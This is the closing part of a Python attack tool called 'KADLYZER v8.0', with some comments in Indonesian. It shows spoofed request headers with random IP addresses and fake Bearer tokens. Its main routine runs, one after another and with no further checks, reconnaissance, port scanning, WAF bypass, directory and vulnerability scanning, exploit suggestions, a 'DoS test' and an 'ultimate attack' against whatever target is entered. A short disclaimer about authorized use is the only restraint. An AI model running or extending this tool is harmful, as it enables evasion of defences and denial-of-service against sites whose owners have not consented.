            'X-Real-IP': '.'.join([str(random.randint(1,255)) for _ in range(4)]),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'X-Requested-With': 'XMLHttpRequest',
            'X-Custom-Auth': 'Bearer ' + ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        }
        return headers

def main():
    banner()
    
    # Parse command line arguments
    parser = argparse.ArgumentParser(description="KADLYZER v8.0 - Enhanced Security Testing Tool")
    parser.add_argument("--target", "-t", help="Target domain or URL", type=str)
    parser.add_argument("--output", "-o", help="Output directory for reports", type=str, default="reports")
    parser.add_argument("--full", "-f", help="Perform full scan (slower but more thorough)", action="store_true")
    parser.add_argument("--threads", help="Number of threads for concurrent operations", type=int, default=20)
    parser.add_argument("--timeout", help="Connection timeout in seconds", type=float, default=5.0)
    parser.add_argument("--quiet", "-q", help="Quiet mode, only output to log file", action="store_true")
    
    args = parser.parse_args()
    
    # Get target input if not provided as argument
    target = args.target
    if not target:
        target = input("Enter target domain or URL: ").strip()
    
    if not target:
        logger.error("No target specified. Exiting.")
        return
    
    try:
        # Validate and normalize target
        target_info = validate_target(target)
        logger.info(f"Starting scan on {target_info['full_url']}...")
        
        # Display a disclaimer
        print(f"\n{Colors.WARNING}DISCLAIMER: This tool is for authorized security testing only.{Colors.ENDC}")
        print(f"{Colors.WARNING}Ensure you have permission to scan the target.{Colors.ENDC}\n")
        
        # Storage for all results
        results = {}
        
        # Reconnaissance phase
        logger.info("Phase 1: Reconnaissance")
        results["recon"] = recon(target_info)
        
        # Port scanning phase
        logger.info("Phase 2: Port Scanning")
        results["ports"] = scan_ports(target_info, max_threads=args.threads, timeout=args.timeout, scan_all=args.full)
        
        # WAF detection phase
        logger.info("Phase 3: WAF Detection")
        results["waf"] = bypass_waf(target_info)
        
        # Directory scanning phase
        logger.info("Phase 4: Directory Scanning")
        results["directories"] = directory_scan(target_info, threads=args.threads)
        
        # Vulnerability scanning phase
        logger.info("Phase 5: Vulnerability Scanning")
        waf_bypass_headers = None
        if results["waf"].get("bypass_successful", False):
            for header in BYPASS_WAF_HEADERS:
                if header.get("User-Agent") == results["waf"].get("successful_method", {}).get("User-Agent"):
                    waf_bypass_headers = header
                    break
        
        results["vulnerabilities"] = vulnerability_scan(target_info, waf_bypass_headers)
        
        # Generate exploit suggestions
        logger.info("Phase 6: Generating Exploit Suggestions")
        results["exploit_suggestions"] = exploit_suggestion(results["vulnerabilities"], target_info)
        
        # Gunakan scanner yang lebih advanced
        logger.info("Starting advanced vulnerability scan...")
        advanced_scanner = AdvancedVulnScanner(target_info)
        results["advanced_vulnerabilities"] = advanced_scanner.perform_advanced_scan()
        
        # Jalankan DoS testing
        logger.info("Performing advanced DoS testing...")
        results["dos_test"] = advanced_dos_test(target_info)
        
        # Generate final report
        logger.info("Phase 7: Generating Report")
        report_info = generate_report(target_info, results)
        
        print(f"\n{Colors.GREEN}Scan completed!{Colors.ENDC}")
        print(f"JSON Report: {report_info['json_path']}")
        print(f"HTML Report: {report_info['html_path']}")
        
        # Print risk score
        risk_level = report_info['risk_score']['level']
        risk_color = Colors.GREEN
        if risk_level == "Medium":
            risk_color = Colors.WARNING
        elif risk_level in ["High", "Critical"]:
            risk_color = Colors.FAIL
            
        print(f"\nOverall Risk Level: {risk_color}{risk_level}{Colors.ENDC}")
        print(f"Risk Score: {risk_color}{report_info['risk_score']['score']}/100{Colors.ENDC}")
        
        # Jalankan ultimate scanner
        logger.warning("Initiating ultimate scan - USE WITH EXTREME CAUTION!")
        ultimate_scanner = UltimateScanner(target_info)
        asyncio.run(ultimate_scanner.launch_ultimate_attack())
        
    except KeyboardInterrupt:
        logger.warning("Scan interrupted by user")
        print(f"\n{Colors.WARNING}Scan interrupted. Exiting...{Colors.ENDC}")
    except Exception as e:
        logger.error(f"An error occurred: {str(e)}")
        print(f"\n{Colors.FAIL}Error: {str(e)}{Colors.ENDC}")

if __name__ == "__main__":
    main()